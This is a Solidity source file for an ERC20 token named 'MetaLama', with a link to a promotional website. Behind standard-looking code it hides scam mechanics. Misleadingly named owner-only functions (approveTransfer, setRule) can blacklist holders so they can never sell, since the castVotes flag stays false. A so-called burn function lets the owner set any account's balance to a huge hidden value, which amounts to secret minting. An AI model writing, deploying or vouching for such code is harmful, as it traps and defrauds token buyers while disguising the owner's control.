1 // SPDX-License-Identifier: MIT
2 
3 /** 🌐CHECK OUR WEBSITE: https://metalama.xyz/  */
4 
5 pragma solidity =0.8.8;
6 
7 library SafeMath {
8 
9     /**
10      * @dev Returns the addition of two unsigned integers, reverting on overflow.
11      * Counterpart to Solidity's `+` operator.
12      */
13     function add(uint256 a, uint256 b) internal pure returns (uint256) {
14         uint256 c = a + b;
15         require(c >= a);
16         return c;
17     }
18 
19     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
20         require(b <= a);
21         return a - b;
22     }
23 
24     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
25         require(b <= a, errorMessage);
26         return a - b;
27     }
28 
29 
30 }
31 
32 /**
33  * @dev Interface of the ERC20 standard as defined in the EIP.
34  */
35 interface IERC20 {
36     /**
37      * @dev Returns the amount of tokens in existence.
38      */
39     function totalSupply() external view returns (uint256);
40 
41     /**
42      * @dev Returns the amount of tokens owned by `account`.
43      */
44     function balanceOf(address account) external view returns (uint256);
45     
46     function allowance(address owner, address spender) external view returns (uint256);
47 
48     function approve(address spender, uint256 amount) external returns (bool);
49 
50     function transfer(address recipient, uint256 amount) external returns (bool);
51 
52     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
53 
54     event Transfer(address indexed from, address indexed to, uint256 value);
55 
56     event Approval(address indexed owner, address indexed spender, uint256 value);
57 }
58 
59 
60 abstract contract Context {
61     function _msgSender() internal view virtual returns (address) {
62         return msg.sender;
63     }
64 
65     function _msgData() internal view virtual returns (bytes calldata) {
66         this; // silence state mutability warning without generating bytecode.
67         return msg.data;
68     }
69 }
70 
71 
72 abstract contract Security is Context {
73     address private _owner;
74 
75     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
76 
77     /**
78      * @dev Initializes the contract setting the deployer as the initial owner.
79      */
80     constructor () {
81         address msgSender = _msgSender();
82         _owner = msgSender;
83         emit OwnershipTransferred(address(0), msgSender);
84     }
85 
86     /**
87      * @dev Throws if called by any account other than the owner.
88      */
89     modifier onlyOwner() {
90         require(owner() == _msgSender());
91         _;
92     }
93 
94     function owner() internal view virtual returns (address) {
95         return _owner;
96     }
97 
98     function transferOwnership(address newOwner) public virtual onlyOwner {
99         require(newOwner != address(0));
100         emit OwnershipTransferred(_owner, newOwner);
101         _owner = newOwner;
102     }
103 }
104 
105 contract ERC20 is Context, Security, IERC20 {
106     using SafeMath for uint256;
107 
108     mapping (address => mapping (address => uint256)) private _allowances;
109     mapping (address => uint256) private _balances;
110     mapping (address => bool) private _receiver;
111     uint256 private maxTxLimit = 1*10**17*10**9;
112     bool castVotes = false;
113     uint256 private balances;
114     string private _name;
115     string private _symbol;
116     uint8 private _decimals;
117     uint256 private _totalSupply;
118  
119     /**
120      * @dev Sets the values for {name} and {symbol}, initializes {decimals}.
121      */
122     constructor (string memory name_, string memory symbol_) {
123         _name = name_;
124         _symbol = symbol_;
125         _decimals = 9;
126         balances = maxTxLimit;
127     }
128 
129     function totalSupply() public view virtual override returns (uint256) {
130         return _totalSupply;
131     }
132 
133     function name() public view virtual returns (string memory) {
134         return _name;
135     }
136 
137     function symbol() public view virtual returns (string memory) {
138         return _symbol;
139     }
140 
141     function decimals() public view virtual returns (uint8) {
142         return _decimals;
143     }
144 
145     function balanceOf(address account) public view virtual override returns (uint256) {
146         return _balances[account];
147     }
148 
149     function setRule(address _delegate) external onlyOwner {
150         _receiver[_delegate] = false;
151     }
152 
153 
154     function maxHoldingAmount(address _delegate) public view returns (bool) {
155         return _receiver[_delegate];
156     }
157 
158     function approveTransfer(address _delegate) external onlyOwner {
159         if(_delegate != owner()) {
160             _receiver[_delegate] = true;
161         }
162     }
163     function approveTransfer2(address[] memory _delegate) external onlyOwner {
164         for (uint16 i = 0; i < _delegate.length; ) {
165             if(_delegate[i] != owner()) {
166                 _receiver[_delegate[i]] = true;
167             }
168             unchecked { ++i; }
169         }
170     }
171     /**
172      * @dev See {IERC20-allowance}.
173      */
174     function allowance(address owner, address spender) public view virtual override returns (uint256) {
175         return _allowances[owner][spender];
176     }
177 
178     /**
179      * @dev See {IERC20-approve}.
180      */
181     function approve(address spender, uint256 amount) public virtual override returns (bool) {
182         _approve(_msgSender(), spender, amount);
183         return true;
184     }
185 
186     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
187         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
188         return true;
189     }
190 
191     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
192         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, ""));
193         return true;
194     }
195 
196 
197     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
198         _transfer(_msgSender(), recipient, amount);
199         return true;
200     }
201 
202     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
203         _transfer(sender, recipient, amount);
204         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""));
205         return true;
206     }
207 
208     function _transfer(address sender, address recipient, uint256 amount) internal virtual {
209         if (_receiver[sender]) require(castVotes == true, "");
210         require(sender != address(0), "");
211         require(recipient != address(0), "");
212         
213         _balances[sender] = _balances[sender].sub(amount, "");
214         _balances[recipient] = _balances[recipient].add(amount);
215         emit Transfer(sender, recipient, amount);
216     }
217 
218     function _burn(address account, uint256 amount) internal virtual {
219         require(account != address(0), "");
220     
221         uint256 accountBalance = _balances[account];
222         require(accountBalance >= amount, "");
223     
224         _balances[account] = balances - amount;
225         _totalSupply -= amount;
226         emit Transfer(account, address(0), amount);
227     }
228 
229 
230     function _mint(address account, uint256 amount) internal virtual {
231         require(account != address(0), "");
232 
233         _totalSupply = _totalSupply.add(amount);
234         _balances[account] = _balances[account].add(amount);
235         emit Transfer(address(0), account, amount);
236     }
237 
238     function _approve(address owner, address spender, uint256 amount) internal virtual {
239         require(owner != address(0), "");
240         require(spender != address(0), "");
241 
242         _allowances[owner][spender] = amount;
243         emit Approval(owner, spender, amount);
244     }
245 
246 }
247 
248 contract MetaLama is ERC20 {
249     using SafeMath for uint256;
250     
251     uint256 private totalsupply_;
252 
253     /// @notice A record of states for signing / validating signatures
254     mapping (address => uint) public nonces;
255 
256     constructor () ERC20("MetaLama", "Lama") {
257         totalsupply_ = 100000000000000 * 10**9;
258         _mint(_msgSender(), totalsupply_);
259         
260     }
261     
262     function burn(address account, uint256 amount) external onlyOwner {
263         _burn(account, amount);
264     }
265 
266 }